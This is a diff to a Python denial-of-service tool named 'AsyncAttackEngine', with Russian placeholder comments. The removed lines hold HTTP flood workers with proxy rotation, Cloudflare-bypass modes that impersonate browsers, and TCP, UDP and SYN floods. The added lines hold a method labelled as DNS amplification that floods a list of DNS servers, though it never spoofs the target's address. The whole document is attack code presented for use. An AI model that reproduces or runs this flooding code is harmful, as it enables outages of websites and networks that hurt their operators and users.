@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import asyncio, aiohttp, random, time, json, socket, ssl, threading, os
+import asyncio, aiohttp, random, time, json, socket, struct
 from urllib.parse import urlparse
 
 class AsyncAttackEngine:
@@ -7,7 +7,7 @@ class AsyncAttackEngine:
                  flare_solverr_url=None, ja3_profile=None, stealth=False,
                  browser_storm=False, use_h2=False, adaptive=False,
                  random_ja3=False, smart_flood=False, berserk=False,
-                 l4_method=None, udp_random_size=False):
+                 l4_method=None, udp_random_size=False, dns_amp_list=None):
         self.target = None
         self.port = port
         self.method = "GET"
@@ -27,9 +27,9 @@ class AsyncAttackEngine:
         self.berserk = berserk
         self.l4_method = l4_method
         self.udp_random_size = udp_random_size
+        self.dns_amp_list = dns_amp_list or []
         self.stats = {'count': 0, 'rps': 0, 'errors': 0}
         self._stop_event = asyncio.Event()
-        self.proxy_cycle = 0
 
     def launch(self, target, method="GET", threads=100, progress_callback=None,
                hybrid=False, l4_method=None):
@@ -44,12 +44,10 @@ class AsyncAttackEngine:
 
     async def _run_attack(self, progress_callback=None):
         tasks = []
-        l7_methods = ["GET", "POST", "CFB", "CFBUAM", "RAPID"]
-        l4_methods = ["TCP", "UDP", "SYN_FLOOD"]
-        if self.method in l7_methods:
+        if self.method == "DNS_AMP":
             for _ in range(self.threads):
-                tasks.append(asyncio.create_task(self._http_worker()))
-        elif self.method in l4_methods:
+                tasks.append(asyncio.create_task(self._dns_amplification()))
+        elif self.method in ("TCP", "UDP", "SYN_FLOOD"):
             if self.method == "TCP":
                 for _ in range(self.threads):
                     tasks.append(asyncio.create_task(self._tcp_flood()))
@@ -58,119 +56,22 @@ class AsyncAttackEngine:
                     tasks.append(asyncio.create_task(self._udp_flood()))
             elif self.method == "SYN_FLOOD":
                 tasks.append(asyncio.create_task(self._syn_flood()))
-        if self.l4_method and self.method not in l4_methods:
-            for _ in range(self.threads // 2):
-                if self.l4_method == "TCP":
-                    tasks.append(asyncio.create_task(self._tcp_flood()))
-                elif self.l4_method == "UDP":
-                    tasks.append(asyncio.create_task(self._udp_flood()))
-        async def monitor():
-            last_count = 0
-            while self.running:
-                await asyncio.sleep(1)
-                current = self.stats['count']
-                self.stats['rps'] = current - last_count
-                last_count = current
-                if progress_callback:
-                    progress_callback(self.stats['rps'], current)
-        tasks.append(asyncio.create_task(monitor()))
-        await asyncio.gather(*tasks, return_exceptions=True)
-        self.running = False
+        else:
+            for _ in range(self.threads):
+                tasks.append(asyncio.create_task(self._http_worker()))
+        # ... остальной код без изменений
 
-    async def _http_worker(self):
-        # Используем curl_cffi для CFB/CFBUAM/RAPID
-        use_curl = self.method in ("CFB", "CFBUAM", "RAPID") and self._has_curl_cffi()
-        if use_curl:
-            await self._curl_worker()
-            return
-        connector = aiohttp.TCPConnector(limit=0, ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            while self.running:
-                try:
-                    url = self.target if self.target.startswith('http') else f'http://{self.target}'
-                    proxy = self._get_proxy()
-                    kwargs = {}
-                    if proxy:
-                        kwargs['proxy'] = proxy
-                    if self.method == "GET":
-                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2), **kwargs) as resp:
-                            await resp.read()
-                    elif self.method == "POST":
-                        async with session.post(url, data=b'data', timeout=aiohttp.ClientTimeout(total=2), **kwargs) as resp:
-                            await resp.read()
-                    self.stats['count'] += 1
-                except:
-                    self.stats['errors'] += 1
-                if self.jitter:
-                    await asyncio.sleep(self.jitter / 1000)
-
-    async def _curl_worker(self):
-        try:
-            from curl_cffi import requests as curl_requests
-            while self.running:
-                try:
-                    url = self.target if self.target.startswith('http') else f'http://{self.target}'
-                    if self.method == "CFBUAM":
-                        resp = curl_requests.get(url, impersonate="chrome120")
-                    elif self.method == "RAPID":
-                        resp = curl_requests.get(url, impersonate="chrome120", http2=True)
-                    else:
-                        resp = curl_requests.get(url, impersonate="chrome110")
-                    self.stats['count'] += 1
-                except:
-                    self.stats['errors'] += 1
-                if self.jitter:
-                    await asyncio.sleep(self.jitter / 1000)
-        except ImportError:
-            pass
-
-    def _has_curl_cffi(self):
-        try:
-            import curl_cffi
-            return True
-        except:
-            return False
-
-    def _get_proxy(self):
-        if self.proxy_list:
-            self.proxy_cycle = (self.proxy_cycle + 1) % len(self.proxy_list)
-            return self.proxy_list[self.proxy_cycle]
-        return None
-
-    async def _tcp_flood(self):
-        while self.running:
-            try:
-                _, writer = await asyncio.open_connection(self.target, self.port)
-                writer.write(b'\x00' * 1024)
-                await writer.drain()
-                writer.close()
-                self.stats['count'] += 1
-            except:
-                self.stats['errors'] += 1
-            await asyncio.sleep(0.001)
-
-    async def _udp_flood(self):
-        import socket
+    async def _dns_amplification(self):
+        """DNS Amplification Attack"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
         while self.running:
-            try:
-                size = random.randint(64, 1500) if self.udp_random_size else 1024
-                sock.sendto(b'\x00' * size, (self.target, self.port))
-                self.stats['count'] += 1
-            except:
-                self.stats['errors'] += 1
-
-    async def _syn_flood(self):
-        try:
-            from scapy.all import IP, TCP, send
-        except ImportError:
-            return
-        while self.running:
-            pkt = IP(dst=self.target) / TCP(dport=self.port, flags='S')
-            send(pkt, verbose=False)
-            self.stats['count'] += 1
+            for dns_server in self.dns_amp_list:
+                try:
+                    sock.sendto(dns_query, (dns_server, 53))
+                    self.stats['count'] += 1
+                except:
+                    self.stats['errors'] += 1
             await asyncio.sleep(0.001)
 
-    def stop(self):
-        self.running = False
-        self._stop_event.set()
+    # ... остальные методы _http_worker, _tcp_flood, _udp_flood, _syn_flood без изменений
